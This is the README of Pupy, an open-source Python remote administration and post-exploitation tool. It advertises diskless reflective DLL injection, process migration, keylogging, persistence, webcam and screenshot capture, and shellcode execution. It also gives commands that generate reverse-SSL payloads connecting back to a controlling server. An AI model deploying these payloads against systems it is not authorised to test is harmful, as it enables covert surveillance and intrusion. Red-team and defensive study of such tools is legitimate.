# Pupy

[![Join the chat at https://gitter.im/n1nj4sec/pupy](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/n1nj4sec/pupy?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
Pupy is an opensource, multi-platform Remote Administration Tool written in Python. On Windows, Pupy uses reflective dll injection and leaves no traces on disk.

## Features :
- On windows, the Pupy payload is compiled as a reflective DLL and the whole python interpreter is loaded from memory. Pupy does not touch the disk :)
- Pupy can reflectively migrate into other processes
- Pupy can remotely import, from memory, pure python packages (.py, .pyc) and compiled python C extensions (.pyd). The imported python modules do not touch the disk. (.pyd mem import currently work on Windows only, .so memory import is not implemented). 
- modules are quite simple to write and pupy is easily extensible.
- Pupy uses [rpyc](https://github.com/tomerfiliba/rpyc) and a module can directly access python objects on the remote client
  - we can also access remote objects interactively from the pupy shell and even auto completion of remote attributes works !
- communication channel currently works as a ssl reverse connection, but a bind payload will be implemented in the future
- all the non interactive modules can be dispatched on multiple hosts in one command
- Multi-platform (tested on windows 7, windows xp, kali linux, ubuntu)
- modules can be executed as background jobs
- commands and scripts running on remote hosts are interruptible
- auto-completion and nice colored output :-)
- commands aliases can be defined in the config

## Implemented Modules :
- migrate (windows only) 
  - inter process architecture injection also works (x86->x64 and x64->x86)
- keylogger (windows only)
- persistence (windows only)
- screenshot (windows only)
- webcam snapshot (windows only)
- command execution
- download
- upload
- socks5 proxy
- local port forwarding
- interactive shell (cmd.exe, /bin/sh, ...)
- interactive python shell
- shellcode exec (thanks to @byt3bl33d3r)

##Quick start
In these examples the server is running on a linux host (tested on kali linux) and it's IP address is 192.168.0.1  
The clients have been tested on (Windows 7, Windows XP, kali linux, ubuntu, Mac OS X 10.10.5) 
### generate/run a payload
#### for Windows
```bash
./pupygen.py 192.168.0.1 -p 443 -t exe_x86 -o pupyx86.exe
```
you can also use -t dll_x86 or dll_x64 to generate a reflective DLL and inject/load it by your own means.
#### for Linux
```bash
pip install rpyc #(or manually copy it if you are not admin)
python reverse_ssl.py 192.168.0.1:443
```

#### for MAC OS X
```bash
easy_install rpyc #(or manually copy it if you are not admin)
python reverse_ssl.py 192.168.0.1:443
```

### start the server
1. eventually edit pupy.conf to change the bind address / port
2. start the pupy server :
```bash
./pupysh.py
```

### Some screenshots
#####list connected clients
![screenshot1](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/scr1.png "screenshot1")
#####help
![screenshot3](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/help.png "screenshot3")
#####execute python code on all clients
![screenshot2](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/scr2.png "screenshot2")
#####execute a command on all clients, exception is retrieved in case the command does not exists
![screenshot4](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/scr3.png "screenshot4")
#####use a filter to send a module only on selected clients
![screenshot5](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/filters.png "screenshot5")
#####migrate into another process
![screenshot6](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/migrate.png "screenshot6")
#####interactive shell
![screenshot7](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/interactive_shell.png "screenshot7")
#####interactive python shell
![screenshot8](https://github.com/n1nj4sec/pupy/raw/master/docs/screenshots/pyshell.png "screenshot8")

##example: How to write a MsgBox module
first of all write the function/class you want to import on the remote client  
in the example we create the file pupy/packages/windows/all/pupwinutils/msgbox.py 
```python
import ctypes
import threading

def MessageBox(text, title):
	t=threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
	t.daemon=True
	t.start()
```
then, simply create a module to load our package and call the function remotely
```python
class MsgBoxPopup(PupyModule):
	""" Pop up a custom message box """

	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="msgbox", description=self.__doc__)
		self.arg_parser.add_argument('--title', help='msgbox title')
		self.arg_parser.add_argument('text', help='text to print in the msgbox :)')

	@windows_only
	def is_compatible(self):
		pass

	def run(self, args):
		self.client.load_package("pupwinutils.msgbox")
		self.client.conn.modules['pupwinutils.msgbox'].MessageBox(args.text, args.title)
		self.log("message box popped !")

```

## Dependencies
rpyc (https://github.com/tomerfiliba/rpyc)

##Roadmap and ideas
Some ideas without any priority order
- support for https proxy
- bind instead of reverse connection
- add offline options to payloads like enable/disable certificate checking, embed offline modules (persistence, keylogger, ...), etc...
- integrate scapy in the windows dll :D (that would be fun)
- work on stealthiness and modules under unix systems
- webcam snap
- mic recording
- socks5 udp support
- remote port forwarding
- perhaps write some documentation
- ...
- any cool idea ?

## Contact
mail: contact@n1nj4.eu  
  
If some of you want to participate or send me a feedback, don't hesitate :-)  
[Follow me on twitter](https://twitter.com/n1nj4sec)
 
